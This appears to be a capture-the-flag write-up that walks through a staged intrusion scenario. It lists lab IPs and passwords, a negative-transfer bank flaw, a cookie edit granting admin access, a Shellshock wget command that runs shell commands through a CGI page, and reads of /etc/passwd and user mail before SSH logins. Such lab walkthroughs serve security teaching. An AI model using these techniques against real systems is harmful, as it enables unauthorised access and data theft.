# Write-up
Note: try to do it yourself, it is a much more rewarding experience. See this as
a last resort resource.

## 1 - Start
start at:
`http://45.55.54.126/`

want to prove that CEO is embezzling funds.

gives employee portal:
`104.236.74.251`
user: `jameson`
pass: `hunter72`

gives bank interface:
`104.236.74.251:3000`
user: `bank`
pass: `pbeukpbnhovhyixcialnlhpzo`


## 2 - Bank & Employee Portal
### 2.1 - Bank Interface
`http://104.236.74.251:3000/`

turns out it allows negative values:

```
TRANSFER CS -1000.0
(wait 10s)
WITHDRAW 1.0
```

gives URL to scraped accounts:
`http://104.236.74.251:3000/JJJ/all-in-internal-network.txt`

### 2.2 - Employee Portal
starts at: `http://104.236.74.251/`

personal site: `http://104.236.74.251/~dglenn/`
see poems, go up a folder, see files: `http://104.236.74.251/~dglenn/private/`

one of the keys: `http://104.236.74.251/~dglenn/private/key.txt`


also, security notice here: `http://104.236.74.251/mail/isn.html`

it tells us that we want to reach the *new* website (we're currently on the old
one).

it tells us that the new website will be on the internal network (good for us).

it tells us that we'll need 5 keys to access the boss docs.



change cookies so that `accesslevel=2` (`document.cookie="accesslevel=2";`), get
admin.


address of new website: `104.131.92.247`

will need to combine keys here: `http://104.236.74.251/~wscott/keys`

will access the boss dosc here: `http://104.236.74.251/` (user `bdupont`)

## 3 - New Website
`http://104.131.92.247/index.cgi`

Apache & CGI? **SHELLSHOCK**!

`wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/ls" http://104.131.92.247/index.cgi`
[resource](http://security.stackexchange.com/a/68203/44738)

gives us the files:

 * `index.cgi` - has code to trigger Shellshock

 * `index.php` - redirects to `index.cgi`

 * `admin.php` - redirects to `gist.github` and `die()`


`ls` on `/home` (or `cat /etc/passwd`) shows there is a user `jhendricks`

`ls` around (`..`), find file `note`, `cat` it:


```
To: Jim Hendricks
From: Carla Lynn
Date: September 5, 2015
Subject: Public frontend

The public frontend has been set up and can be found at 104.131.92.247

Your user account is as follows:

Username: jhendricks
Password: oXwBJMtx3BJ5yKg

As an IT manager it is your responsibility to make sure this server, as well as our other servers, are frequently updated with the latest patches available.

Please keep this memo safe and change your password immediately.

Regional IT Director
Carla Lynn
```

## 4 - Jhendricks
frontend is at: `104.131.92.247`

user: `jhendricks`
pass: `oXwBJMtx3BJ5yKg`

Those are valid SSH creds. Login.


Running `set` to see env vars, see MAIL (learned about that var and that is
represents unread emails).

`cat /var/spool/mail/jhendricks`:

```
From carla@thenorth.com  Sat Sep  5 02:41:53 2015
Return-Path: <carla@thenorth.com>
X-Original-To: jhendricks@thenorth.com
Delivered-To: jhendricks@thenorth.com
Received: by mail3.thenorth.com
  id B24C33FEA3; Sat,  5 Sep 2015 02:41:53 -0400 (EDT)
  Date: Sat, 05 Sep 2015 02:41:53 -0400
  To: jhendricks@thenorth.com
  Subject: Info
  MIME-Version: 1.0
  Content-Type: text/plain; charset=us-ascii
  Content-Transfer-Encoding: 7bit
  Message-Id: <20150905064153.B24C33FEA3@thenorth.com>
  From: carla@thenorth.com (carla)
  Status: RO

  Here are our servers. I'll keep you updated as we get more

  10.132.106.223 - 104.236.251.33
  10.132.3.229 - 45.55.179.181
  10.132.170.147 - 45.55.183.167
  10.132.114.141 - 45.55.47.192
  10.132.34.120 - 104.131.109.3
```


Could login to `45.55.47.192` with `wscott`:
user: `wscott`
pass: `oTLhoRZ8JOIDhkD`

## 5 - Wscott
SSH to `45.55.47.192`
user: `wscott`
pass: `oTLhoRZ8JOIDhkD`

`cat secretkey/README`:

```
If you're snooping around in this folder, you're
either Wesley (myself) or an intruder. If the latter
is true, get lost.

----

New security policy means that our keys can be combined
to get Bert's secret. Until the security of these
servers is proven in practice keys should be stored on
the old webserver, here:

http://104.236.74.251/~wscott/secret

Key is protected with a passphrase. The passphrase is
not stored in plaintext for security purposes. Instead
it is hashed with /usr/local/bin/securehash. Of course
secure hash is chosen because it is far more secure than
broken hash functions such as MD5.

Oh, and if you're an intruder: securehash is not related
to NIST's "SHA ('Secure' Hash Algorithm)" which is of
course not secure at all. securehash is my own invention
and nobody has broken it at all yet, so you can leave now.

Hash: 84c355da8831b62075d2ad9133ce6512
```
